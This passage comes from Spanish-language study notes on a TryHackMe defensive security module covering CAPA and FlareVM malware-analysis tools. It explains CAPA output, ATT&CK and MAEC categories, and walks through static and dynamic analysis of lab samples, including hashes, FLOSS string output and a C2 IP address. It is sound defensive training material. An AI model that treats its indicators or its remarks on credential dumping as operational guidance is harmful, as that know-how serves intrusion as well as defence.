cryptocurrency strings**: Debería estar bajo **impact**, sin embargo está en **nursery**.\n\nAhora que tenemos un buen entendimiento y vista sobre los contenidos de Capability y Namespace, deberíamos ser capaces de explicar los resultados del ejemplo de la tarea pasada.\n\nHagamos un rápido repaso:\n\n```powershell\n┌───────────────────────────────────────────┬───────────────────────────────────┐\n│ Capability                                │ Namespace                         │\n├───────────────────────────────────────────┼───────────────────────────────────┤\n│ reference Base64 string                   │ data-manipulation/encoding/base64 │\n└───────────────────────────────────────────┴───────────────────────────────────┘\n```\n\nLa explicación:\n\n| Etiqueta                | Valor                           | Explicación                                                                                                                     |\n| ----------------------- | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |\n| Capability              | **reference base64 string**     | El malware tiene la habilidad de codificar información usando Base64.                                                           |\n| Top-Level Namespace     | **data-manipulation**           | Contiene un conjunto de reglas que rige los comportamientos involucrados en la alteración de información (data transformation). |\n| Namespace               | **encoding/base64**             | Consiste en las reglas para encodear y decodear usando Base64 y XOR.                                                            |\n| Rule YAML File Matched? | **reference-base64-string.yml** | Recuerda que en casi todos los casos el nombre de la regla es el nombre de la Capability con guiones en lugar de espacios.      |\n\nSabiendo esta información podemos concretar que el archivo usa el esquema de encodeado Base64."
  },
  {
    "title": "0. CAPA - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/0-capa-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/0. CAPA - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/1. Introduction]]\n[[2. Tool Overview - How CAPA Works]]\n[[3. Dissecting CAPA Results Part 1 - General Information, MITRE and MAEC]]\n[[4. Dissecting CAPA Results Part 2 - Malware Behavior Catalogue]]\n[[5. Dissecting CAPA Results Part 3 - Namespaces]]\n[[6. Dissecting CAPA Results Part 4 - Capability]]\n[[7. More Information, more fun!]]\n\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "Uno de los retos al analizar software potencialmente malicioso es que nos arriesgamos a que nuestra propia máquina o entorno sea comprometido cuando lo ejecutamos. Generalmente existen dos tipos de análisis: dinámico y estático. Esta habitación se centra en realizar análisis estático usando una herramienta llamada CAPA.\n\nCAPA (Common Analysis Platform for Artifacts) es una herramienta desarrollada por el equipo FireEye Mandiant. Está diseñada para identificar las capabilidades presentes en un ejecutable como PE, ELF, .NET, shellcode incluso reportes sandbox. Hace eso analizando el archivo y aplicando un set de reglas que describen comportamientos comunes, permitiéndole determinar que es capaz de hacer el programa, como comunicarse por red, manipular archivos, inyectar procesos, y más.\n\nLa belleza de CAPA es que encapsula años de conocimiento sobre ingeniería inversa en una herramienta automatizada, haciéndola accesible incluso a aquellos que no son expertos en ingeniería inversa.\n\nEsta herramienta es particularmente útil en análisis de malware y caza de amenazas.\n\n-----------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Explorar qué es CAPA\n- Aprender a usar CAPA de forma eficiente\n- Entender campos comunes y resultados arrojados por la herramienta\n- Usar la herramienta para identificar la potencial actividad de un programa\n"
  },
  {
    "title": "3. Dissecting CAPA Results Part 1 - General Information, MITRE and MAEC",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/3-dissecting-capa-results-part-1-general-information-mitre-and-maec/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/3. Dissecting CAPA Results Part 1 - General Information, MITRE and MAEC.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "Como hemos mencionado en la tarea anterior, los resultados de ejecutar CAPA contra cryptbot.bin serán discutidos. Vamos a diseccionar los resultados por bloque y tópico.\n\nEl primer bloque contiene información de dominio básica sobre el archivo. Esto incluye lo siguiente:\n\n- Los algoritmos criptográficos, como `md5` y `sha1/256`.\n- El campo `analysis` nos dice cómo realizó CAPA el análisis del archivo.\n- El campo `os` revela el sistema operativo para el que aplican las capacidades detectadas.\n- El campo `arch` nos permite determinar si estamos lidiando con un binario relacionado a arquitectura x86.\n- El campo `path` donde estaba localizado el archivo analizado.\n\n```powershell\n┌─────────────┬─────────────────────────────────────────────────────────────────┐\n│ md5         │ 3b9d26d2e7433749f2c32edb13a2b0a2                                │\n│ sha1        │ 969437df8f4ad08542ce8fc9831fc49a7765b7c5                        │\n│ sha256      │ ae7bc6b6f6ecb206a7b957e4bb86e0d11845c5b2d9f7a00a482bef63b567ce4c│\n│ analysis    │ static                                                          │\n│ os          │ windows                                                         │\n│ format      │ pe                                                              │\n│ arch        │ i386                                                            │\n│ path        │ /home/strategos/Room-CAPA/cryptbot.bin                          │\n└─────────────┴─────────────────────────────────────────────────────────────────┘\n```\n\n-------------------------------\n<h2>MITRE ATT&CK</h2>\nEl framework MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) es un repositorio de conocimiento global que meticulosamente documenta las tácticas y técnicas empleadas por los actores de amenazas en cada fase de un ciberataque. Funciona como un playbook estratégico, ofreciendo vistas detalladas en los métodos de los atacantes, desde ganar acceso inicial hasta mantener presencia (persistencia), escalar privilegios, evadir defensas, mover lateralmente en la red y un largo etcétera.\n\nCAPA usa este formato para su output. Algunos resultados pueden no contener el identificador de técnica o subtécnica.\n\n| Formato                                                                                                                    | Ejemplo                                                                                  | Explicación                                                                                                                                                                                                                                |\n| -------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| **ATT&CK Tactic**::**ATT&CK Technique**::**Technique Identifier**                                                          | Defense Evasion::Obfuscated Files or Information::T1027                                  | **DEFENSE EVASION =** ATT&CK Tactic  <br>**Obfuscated Files or Information =** ATT&CK Technique  <br>**T1027 =** Technique Identifier                                                                                                      |\n| **ATT&CK Tactic**::**ATT&CK Technique**::**ATT&CK Sub-Technique**::**Technique Identifier**[.]Sub-technique **Identifier** | Defense Evasion::Obfuscated Files or Information::Indicator Removal from Tools T1027.005 | **DEFENSE EVASION** = ATT&CK Tactic  <br>**Obfuscated Files or Information** = ATT&CK Technique  <br>**Indicator Removal from Tools** = ATT&CK Sub-Technique  <br>**T1027 =** Technique Identifier  <br>**005** = Sub-Technique Identifier |\n\n```powershell\n┌──────────────────────┬────────────────────────────────────────────────────────┐\n│ ATT&CK Tactic        │ ATT&CK Technique                                       │\n├──────────────────────┼────────────────────────────────────────────────────────┤\n│ DEFENSE EVASION      │ Obfuscated Files or Information [T1027]                │\n│                      │ Obfuscated Files or Information::Indicator Removal from Tools [T1027.005]│\n│                      │ Virtualization/Sandbox Evasion::System Checks [T1497.001]│\n│ DISCOVERY            │ File and Directory Discovery [T1083]                   │\n│ EXECUTION            │ Command and Scripting Interpreter::PowerShell [T1059.001]│\n│                      │ Shared Modules [T1129]                                 │\n│ IMPACT               │ Resource Hijacking [T1496]                             │\n│ PERSISTENCE          │ Scheduled Task/Job::At [T1053.002]                     │\n│                      │ Scheduled Task/Job::Scheduled Task [T1053.005]         │\n└──────────────────────┴────────────────────────────────────────────────────────┘\n```\n\nEn el output final de CAPA, referencian el framework MITRE. Esto ayuda a los analistas o defensores a mapear el comportamiento del archivo con el playbook del adversario, lo que puede ayudar acotar el alcance de la investigación durante un incidente. \n\n---------------------------------\n<h2>MAEC</h2>\nMAEC (Malware Attribute Enumeration and Characterization) es un lenguaje especializado diseñado para encodear y comunicar detalles complejos respecto a malware. Contiene un rango extenso de atributos, incluyendo comportamientos, artefactos e interconexiones entre varias instancias de malware. Este lenguaje funciona como un sistema estandarizado para trackear y analizar las complejidades del malware.\n\n```powershell\n┌─────────────────────────────┬─────────────────────────────────────────────────┐\n│ MAEC Category               │ MAEC Value                                      │\n├─────────────────────────────┼─────────────────────────────────────────────────┤\n│ malware-category            │ launcher                                        │\n└─────────────────────────────┴─────────────────────────────────────────────────┘\n```\n\nComprobemos la tabla debajo para ver los valores MAEC más usados por CAPA: Downloader y Launcher.\n\n| **MAEC Value** | Description                                                                                                    |\n| -------------- | -------------------------------------------------------------------------------------------------------------- |\n| Launcher       | Exhibe comportamientos que disparan acciones específicas similares al comportamiento del malware.              |\n| Downloader     | Exhibe comportamientos en los que descarga y ejecuta otros archivos, usualmente visto en malware más complejo. |\nCuando CAPA etiqueta un archivo con el valor MAEC \"**launcher**\", indica que el archivo muestra comportamiento similar (pero no limitado) a:\n\n- Ejecutar payloads adicionales\n- Activar mecanismos de persistencia\n- Conectarse a servidores C2 (Command & Control)\n- Ejecutar funciones específicas\n\nAlgunos de estos comportamientos también están presentes en el catálogo de comportamiento de malware (MBC) y el bloque de capabilities, que veremos más adelante.\n\nCuando CAPA etiqueta un archivo con el valor MAEC \"**downloader**\", indica que el archivo muestra comportamiento similar (pero no limitado) a:\n\n- Descargar payloads adicionales o recursos de internet\n- Descargar actualizaciones\n- Ejecutar payloads secundarios\n- Ejecutar etapas secundarias\n- Recoger archivos de configuración\n\n"
  },
  {
    "title": "3. Commonly Used Tools for Investigation - Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/4-flarevm-arsenal-of-tools/3-commonly-used-tools-for-investigation-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/3. Commonly Used Tools for Investigation - Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 4. FlareVM - Arsenal of Tools",
    "content": "Examinemos las herramientas en las que nos enfocaremos en esta unidad.Estas son las básicas usadas en investigaciones iniciales:\n\n| **Herramienta**  | **Valor Investigativo**                                                                                                                   |\n| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |\n| Procmon          | Una herramienta útil para rastrear la actividad del sistema, especialmente en lo concerniente al malware.                                 |\n| Process Explorer | Te permite ver el proceso de la relación padre-hijo, DLLs cargados y su ruta.                                                             |\n| HxD              | Los archivos maliciosos pueden ser examinados o alterados vía ecidión hexadecimal.                                                        |\n| Wireshark        | Observar e invesstigar el tráfico de red buscando actividad inusual.                                                                      |\n| CFF Explorer     | Puede generar hashes de archivos para verificación de integridad, autentificar la fuente de los archivos de sistema y validar su validez. |\n| PEStudio         | Análisis estático o estudiarpropiedades de un archivo ejecutable sin ejecutarlo.                                                          |\n| FLOSS            | Extrae y desofusca todas las strings de un programa de malware usando técnicas avanzadas de análisis estático.                            |\n\n------------------------------------\n<h2>Process Monitor (Procmon)</h2>\nUna poderosa herramienta diseñada para ayudarte a grabar problemas con las apps de tu sistema. Te deja ver, grabar y llevar control del sistema y la actividad de archivos de Windows en tiempo real. Es útil en cuanto a rastrear la actividad del sistema, especialmente en lo relacionado a la investigación de malware, resolución de problemas e investigaciones forenses.\n\nAsí se utiliza de manera eficiente para la investigación:\n\n![[Pasted image 20251030102159.png]]\n\nDe acuerdo con esta entrada de logs, el Servicio del Autoridad de Seguridad Local del Subsistema (LSASS), con proceso lsass.exe ha leído un archivo exitosamente. LSASS maneja autentificación y se comunica frecuentemente con los archivos cruciales del sistema como lsasrv.dll (Local Security Authority Server Service).\n\nAunque es un archivo estándar del sistema, LSASS puede ser objetivo de dumpeo de credenciales. Mimikatz y otras herramientas suelen intentar acceder a la memoria de LSASS. Deberías fijarte en actividad adicional.\n\n------------------------\n<h2>Process Explorer (Procexp)</h2>\nOfrece vistas profundas de los procesos activos corriendo en tu ordenador. Te permite ahondar en los trabajos internos de tu sistema, ofreciendo una lista de los procesos activos y sus cuentas de usuario relacionadas. Si alguna vez has sentido curiosidad sobre qué programa está accediendo a un archivo o directorio específico, Process Explorer nos ofrece esa información.\n\n![[Pasted image 20251030104256.png]]\n\nComo puedes ver por la imagen de arriba, CFF Explorer está abierto. Usando **Process Explorer (procexp)**, localizado en el escritorio, podemos identificar el proceso y su padre. Esto es útil cuando queremos monitorizar qué otros procesos están siendo creados como documentos Word, LNK (archivos link, o redirecciones) o ISO, ya que los actores maliciosos suelen abusarlos.\n\n---------------------------------\n<h2>HxD</h2>\nEs un editor hexadecimal rápido y ligero que sirvepara editar archivos, memoria y drives de cualquier capacidad. Puede ser aplicado a la investigación forense, recuperación de información, depuración y manipulación exacta de información binaria. Algunas funcionalidades importantes son la vista del archivo y sus contenidos de memoria, edición, búsqueda y comparación de información hexadecimal. Veamos cómo funciona la herramienta.\n\n![[Pasted image 20251030110216.png]]\n\nEsta captura del editor hexadecimal HxD muestra el archivo binario **posible_medusa.txt**. La información hexadecimal en la izquierda indica el contenido del archivo en hexadecimal y la interpretación ASCII aparece a la derecha. Interesantemente, el archivo empieza con **4D 5A (Little Endian)**, indicando que es ejecutable.\n\nEl inspector de información, a la derecha, nos permite examinar bytes individuales mostrando sus valores en varios tipos de información (int, float, etc.), facilitando la evalucación de dicha información.\n\n--------------------------------\n<h2>CFF Explorer</h2>\nCon la ayuda de la información de archivo que brinda CFF Explorer, los investigadores pueden generar hashes de archivos para verificar su integridad, autentificar la fuente del sistema de archivos y validar su validez. Esto es importante saberlo al analizar malware ya que el código malicioso puede esconderse en archivos de sistema alterados.\n\n![[Pasted image 20251030111047.png]]\n\nLos detalles del archivo **cryptominer.bin** se muestran en el ejemplo. El 23 de Septiembre de 2024, se generó un archivo PE de 64 bits. La información del archivo puede ser verificada con hashes (SHA-1 y MD5), Durante las investigaciones, esta herramienta ayuda en la confirmación de la información del archivo y localizando posible problemas.\n\n--------------------------------\n<h2>Wireshark</h2>\nConcerniente al análisis de tráfico de red, Wireshark es una herramienta poderosa que los investigadores pueden usar para cazar conexiones sospechosas, examinar protocolos y encontrar posibles asaltos o exfiltración de información. En este caso TLSv1.2 sugiere una conexión segura y encriptada que puede enmascarar actividad dañina.\n\n![[Pasted image 20251030111613.png]]\n\nMuestra paquetes capturados con detalles sobre protocolo, fuente, destinación y otra información. La mayoría de los paquetes muestran que TLSv1.2 y TCP se usan para transmisiones encriptadas. La información raw de los paquetes se muestra en ASCII y hexadecimal, con un bloque significativo encriptado usando TLSv1.2.\n\n---------------------------------\n<h2>PEStudio</h2>\nAnálisis estático, o estudiar propiedades de archivos ejecutables sin correr los archivos se hace con PEStudio. Esta funcionalidad es beneficiosa en varias situaciones. PEStudio ofrece una variedad de información sobre el archivo sin poner a los usuarios en peligro. PEStudio ofrece una variedad de información sobre un archivo sin poner a los usuarios en riesgo por la ejecución, lo que ayuda en identificar ejecutables que parecen o son sospechosos de ser dañinos.\n\n![[Pasted image 20251030112822.png]]\n\nEste ejemplo muestra la examinación de un archivo ejecutable, como PSexec.exe, usando PEStudio 9.22, una herramienta de análisis estático. Este archivo tiene un propósito doble, legítimo por administradores de sistema pero potencialmente explotado por hackers buscando acceso remoto.\n\nLa entropía del archivo de **6.596** sugiere la posibilidad remota de empaquetado o encriptación, que es típico de software peligroso.La versión **2.34** de esta consola basada en 32 bits, permite que el programa se ejecute remotamente, una funcionalidad frecuentemente usada para migrar lateralmente durante los ataques. El archivo se ensambla usando Visual C++ 8.\n\n--------------------------------\n<h2>FLOSS</h2>\nUsando técnicas avanzadas de análisis estático, el Solucionador de Strings Ofuscadas de FLARE (FLOSS) extrae utomáticamente y desofusca todas las strings de los programas de malware. Como strings.exe, puede mejorar el análisis estático básico de binarios desconocidos. FLOSS también incluye más scripts de Python en el directorio de scripts, lo que puede ser usado para cargar el output del script en otros programas.\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\Sample > floss .\\cobaltstrike.exe\nINFO: floss: extracting static strings\nfinding decoding function features: 100%|█████████████████████████████████████████████| 74/74 [00:00<00:00, 2370.15 functions/s, skipped 0 library functions]\nINFO: floss.stackstrings: extracting stackstrings from 50 functions\nextracting stackstrings: 100%|██████████████████████████████████████████████████████████████████████████████████████| 50/50 [00:00<00:00, 128.00 functions/s]\nINFO: floss.tightstrings: extracting tightstrings from 4 functions...\nextracting tightstrings from function 0x402e80: 100%|██████████████████████████████████████████████████████████████████| 4/4 [00:00<00:00, 31.99 functions/s]\nINFO: floss.string_decoder: decoding strings\nemulating function 0x402e80 (call 1/1): 100%|████████████████████████████████████████████████████████████████████████| 21/21 [00:09<00:00,  2.21 functions/s]\nINFO: floss: finished execution after 265.61 seconds\nINFO: floss: rendering results \n\n\nFLARE FLOSS RESULTS (version v3.1.0-0-gdb9af41)\n\n+------------------------+------------------------------------------------------+\n| file path              | cobaltstrike.exe                                     |\n| identified language    | unknown                                              |\n| extracted strings      |                                                      |\n|  static strings        | 189 (2050 characters)                                |\n|   language strings     |   0 (   0 characters)                                |\n|  stack strings         | 0                                                    |\n|  tight strings         | 0                                                    |\n|  decoded strings       | 0                                                    |\n+------------------------+------------------------------------------------------+\n\n\n ────────────────────────────\n  FLOSS STATIC STRINGS (189)\n ────────────────────────────\n\n+-----------------------------------+\n| FLOSS STATIC STRINGS: ASCII (188) |\n+-----------------------------------+\n\n!This program cannot be run in DOS mode.\n.text\nP`.data\n.rdata\nP@.pdata\n0@.xdata\n0@.bss\n.idata\n.CRT\n.tls\nffffff.\nATUWVSH\n\n[...]\n\nstrncmp\nvfprintf\nKERNEL32.dll\nmsvcrt.dll\n\n\n+------------------------------------+\n| FLOSS STATIC STRINGS: UTF-16LE (1) |\n+------------------------------------+\n\nmsvcrt.dll\n\n\n ─────────────────────────\n  FLOSS STACK STRINGS (0)\n ─────────────────────────\n\n\n\n ─────────────────────────\n  FLOSS TIGHT STRINGS (0)\n ─────────────────────────\n\n\n\n ───────────────────────────\n  FLOSS DECODED STRINGS (0)\n ───────────────────────────\n```\n\nEn este ejemplo, FLOSS extrajo 189 strings estáticas del binario que pueden contener información hardcodeada como rutas, URLs, direcciones IP, llamadas a APIs, mensajes de error, registros, claves de encriptación y configuración de información. Sin embargo no fueron identificadas ninguna string descodificada."
  },
  {
    "title": "4. Analyzing Malicious Files!",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/4-flarevm-arsenal-of-tools/4-analyzing-malicious-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/4. Analyzing Malicious Files!.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 4. FlareVM - Arsenal of Tools",
    "content": "En esta tarea nos mancharemos las manos. Vamos a ello.\n\nUsando las herramientas de nuestra máquina FLARE, analizaremos diferentes ejecutables, los ejecutaremos y veremos qué hacen en una máquina.\n\nUn archivo malicioso **windows.exe** fue descargado por un usuario el 24/09/2024 a las 3:43 PM. Esta descarga fue etiquetada como una amenaza potencial. El equipo de monitorización te ha enviado un email pidiéndote realizar un análisis de él. Te han mandado el archivo que ahora está en: `C:\\Users\\Administrator\\Desktop\\Sample`.\n\n![[Pasted image 20251030121219.png]]\n\nEn nuestro acercamiento inicial a la investigación, realizaremos un análisis estático para obtener información inicial del binario.\n\n-----------------------------\n<h2>Análisis usando PEStudio</h2>\nEmpecemos con PEStudio. Abre el archivo con esta herramienta, ¿Qué información podemos usar aquí?\n\n![[Pasted image 20251030122444.png]]\n\nPara los hashes generados en MD5 `9FDD4767DE5AEC8E577C1916ECC3E1D6` y SHA-1 `A1BC55A7931BFCD24651357829C460FD3DC4828F`, se recomienda compararlos en bases de datos como [VirusTotal](https://www.virustotal.com/gui/). Si no hay coincidencias es probable de que se trate de una nueva campaña de malware.\n\nAunque el archivo dice estar conectado al Editor de Registros de Windows (REGEDIT), que podemos ver basada en la descripción, es probablemente un truco para jugársela a la gente y evadir la detección.\n\nHerramientas legítimas de REGEDIT se suelen encontrar en `C:\\Windows\\System32` más que en la carpeta de descargas.\n\n¿Qué más?\n\n![[Pasted image 20251030123024.png]]\n\nРедактор реестра\" - \"Registry Editor\", \"Операционная система Microsoft® Windows®\"), en los metadatos del archivo es bastante sospechoso. Más que nada porque ni el usuario ni la organización opera en un entorno de habla rusa.\n\nLa ausencia de un **rich header** indica que el archivo es potencialmente empaquetado u ofuscado para evitar detección en herramientas de análisis estático. Este es un comportamiento típico de malware sofisticado que intenta evadir la detección alterando secciones críticas del archivo PE.\n\nLa pestaña funciones lista las llamadas a APIs que el archivo ha importado. Esto también se conoce como IAT (Import Address Table). Haciendo click en la pestaña de lista negra, PEStudio reorganizará la pestaña moviendo todas aquellas en la lista negra arriba.\n\n![[Pasted image 20251030123525.png]]\n\nAquí algunas funciones importantes que vimos:\n\n- `set_UseShellExecute`: Esta función permite al proceso usar la shell del sistema operativo para ejecutar otros procesos. Se suele ver en malware que crea nuevos procesos para llevar a cabo las acciones maliciosas.\n- `CryptoStream, RijndaelManage, CipherMode, CreateDecryptor`: Estas APIs indican que los ejecutables usan funciones criptográficas, especialmente Rijndael (encriptación AES). El malware puede usar encriptación criptográfica para comunicaciones y archivos o incluso para implementar funcionalidades del malware.\n\n-------------------------------\n<h2>Análisis usando FLOSS</h2>\nAbre PowerShell y ve al directorio donde está nuestro archivo, que es `C:\\Users\\Administrator\\Desktop\\Sample`. Ejecuta el comando `FLOSS.exe .\\windows.exe > windows.txt`. Esto ejecutará la herramienta FLOSS y guardará el resultado de la ejecución en `windows.txt`.\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\Sample > FLOSS.exe .\\windows.exe > windows.txt\nWARNING: floss: .NET language-specific string extraction is not supported yet\nWARNING: floss: FLOSS does NOT attempt to deobfuscate any strings from .NET binaries\nINFO: floss: disabled string deobfuscation\nINFO: floss: extracting static strings\nINFO: floss: finished execution after 0.34 seconds\nINFO: floss: rendering results\n```\n\nAbre el archivo y ve a la parte de abajo del resultado:\n\n![[Pasted image 20251030124700.png]]\n\n¿Te resultan familiares? Son las funciones que vimos antes usando la herramienta PEStudio.\n\n------------------------------\n<h2>Análisis con Process Explorer y Process Monitor</h2>\nEn este ejemplo, analizaremos la conexión de red del archivo **cobaltstrike.exe** localizado en `C:\\Users\\Administrator\\Desktop\\Sample`.\n\nTrataremos de saber si el archivo está realizando alguna conexión de red a algún posible servidor C2. Ejecuta el archivo **cobaltstrike.exe** y abre **Process Explorer** en el escritorio o desde la barra de tareas.\n\n![[Pasted image 20251030125121.png]]\n\nEl ID del proceso (PID) es 4756. Date cuenta de que el PID puede ser diferente en tu máquina. Haz click en el proceso, selecciona **Propiedades** y ve a la pestaña **TCP/IP**. Deberíamos ser capaces de determinar el destino al que se conecta y el estado que manda.\n\n![[Pasted image 20251030125248.png]]\n\nAhí lo tenemos. En otra nota, cuando hacemos el análisis debemos verificarlo con precisión. Así no dependeremos sólo de una herramienta. Para el proceso y vuelve a ejecutarlo. Esta vez usaremos **Procmon**.\n\nCuando abrimos procmon, buscar el binario es un reto ya que este lista todos los pocesos activos. Lo que vamos a hacer es filtrarlo. Puedes darle al icono de abajo o hacer **CRTL + L**.\n\n![[Pasted image 20251030125458.png]]\n\nUsar este filtro involucra varios pasos:\n\n1. Seleccionar **Process Name**.\n2. Seleccionar **Contains**.\n3. Escribir cualquier palabra relacionada con el proceso. En este caso **cobalt**.\n4. Click en **include**.\n5. Click en **Add** y luego en **Apply**.\n6. Deberíamos ver las condiciones añadidas.\n   ![[Pasted image 20251030125703.png]]\n\nEsto debería darnos un resultado más detallado.\n\n![[Pasted image 20251030125734.png]]\n\nEsto nos confirma que el binario estaba en efecto realizando una conexión a una IP desconocida que es `47.120.46.210`.\n\n"
  },
  {
    "title": "0. FlareVM - Arsenal of Tools",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/4-flarevm-arsenal-of-tools/0-flarevm-arsenal-of-tools/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/0. FlareVM - Arsenal of Tools.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 4. FlareVM - Arsenal of Tools",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/1. Introduction]]\n[[2. Arsenal of Tools]]\n[[3. Commonly Used Tools for Investigation - Overview]]\n[[4. Analyzing Malicious Files!]]\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/4-flarevm-arsenal-of-tools/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 4. FlareVM - Arsenal of Tools",
    "content": "FlareVM o \"Forensics, Logic Analysis, and Reverse Engineering\", destaca como una colección curada de herramientas especializadas únicamente para responder a los requisitos de los ingenieros, analistas de malware, incident responders, investigadores forenses y pentesters. Este kit de herramientas diseñado de manera experta por el equipo FLARE de FireEye, es una poderosa ayuda al investigar o destapar misterios digitales y ganar visión dentro del comportamiento del malware.\n\n---------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Explorar herramientas dentro de FlareVM.\n- Aprender cómo usar herramientas para analizar procesos potencialmente maliciosos.\n- Familiarizarse con las herramientas usadas por el análisis estático de documentos y binarios maliciosos.\n\n-------------------------\n<h2>Pre-requisitos</h2>\nSe espera que estés familiarizado con Windows y procesos. Si no lo estás considera estudiar primero [[1. Pre Security]].\n\n"
  },
  {
    "title": "2. Arsenal of Tools",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/4-flarevm-arsenal-of-tools/2-arsenal-of-tools/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/2. Arsenal of Tools.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 4. FlareVM - Arsenal of Tools",
    "content": "En esta tarea te introduciremos a las herramientas en FlareVM. Tiene múltiples herramientas de forénsica, respuesta a incidentes e investigación de malware.\n\nTe mostramos las herramientas agrupadas por categoría.\n\n-------------------------------\n<h2>Ingeniería Inversa y Depuración</h2>\nLa ingeniería inversa es como resolver un puzzle al revés. Tomas un producto terminado y lo separas en piezas para entenderlo. Depurar es identificar errores, entender por qué pasan y corregirlos para prevenirlos.\n\n- **Ghidra:** Desarrollada por la NSA, suite de ingeniería inversa de código abierto.\n- **x64dbg:** Depurador de código abierto para binario en formatos x32 y x64.\n- **OllyDbg:** Depurador para ingeniería inversa a nivel de ensamblador.\n- **Radare2:** Una plataforma sofisticada de código abierto para ingeniería inversa.\n- **Binary Ninja:** Herramienta para desensamblar y descompilar archivos.\n- **PEiD:** Herramienta de empaquetado, criptografía y compilado.\n\n-----------------------------------\n<h2>Desensambladores y Descompiladores</h2>\nLos desensambladores y descompiladores son herramientas clave en el análisis de malware. Ayudan a los analistas a entender los comportamientos, la lógica y el control de flujo del software malicioso separándolo en partes más entendibles.\n\n- **CFF Explorer:** Editor para analizar y editar archivos Portable Executable (PE).\n- **Hopper Disassembler:** Depurador, desensamblador y descompilador.\n- **RetDec:** Descompilador de código abierto para código máquina.\n\n----------------------------------\n<h2>Análisis Estático y Dinámico</h2>\nAnálisis estático y dinámico son dos métodos cruciales en ciberseguridad para examinar malware. El análisis estático incluye inspeccionar el código sin ejecutarlo, mientras que el análisis dinámico consiste en ejecutarlo y ver cómo se comporta.\n\n- **Process Hacker:** Editor de memoria y visor de procesos sofisticado.\n- **PEview:**  Visor de archivos PE para análisis.\n- **Dependency Walker:** Herramienta para mostrar las dependencias DLL de un ejecutable.\n- **DIE (Detect It Easy):** Un empaquetador, compilador y detector de criptominería.\n\n---------------------------\n<h2>Forénsica y Respuesta a Incidentes</h2>\nLa forénsica digital incluye la recolección, análisis y preservación de evidencia digital de varias fuentes como ordenadores, redes y dispositivos de almacenamiento. La respuesta a incidentes se centra en la detección, contención, erradicación y recuperación de ciberataques.\n\n- **Volatility:** Framework de análisis de memoria RAM para forense.\n- **Rekall:** Framework para memoria forense en respuesta a incidentes.\n- **FTK Imager:** Adquisición de imágenes de disco y herramientas de análisis de uso forense.\n\n---------------------------\n<h2>Análisis de Red</h2>\nEl análisis de red incluye diferentes métodos y técnicas para estudiar y analizar redes para descubrir patrones, optimizar el rendimiento y entender la estructura y comportamiento de la red.\n\n- **Wireshark:** Analizador de paquetes y protocolos de red para grabar y analizar tráfico.\n- **Nmap:** Herramienta de mapeo y detección de vulnerabilidades.\n- **Netcat:** Escribe y lee información a lo largo de las conexiones de red con esta herramienta.\n\n------------------------------\n<h2>Análisis de Archivos</h2>\nEl análisis de archivos es una técnica usada para examinar archivos en busca de amenazas potenciales para la seguridad y asegurar los permisos correctos.\n\n- **FileInsight:** Programa para mirar a través y editar binarios.\n- **Hex Fiend:** Editor hexadecimal rápido y ligero.\n- **HxD:** Visor y editor de archivos binarios con editor hexadecimal.\n\n------------------------\n<h2>Scripting y Automatización</h2>\nInvolucra usar scripts como de PowerShell y Python para automatizar tareas y procesos repetitivos., 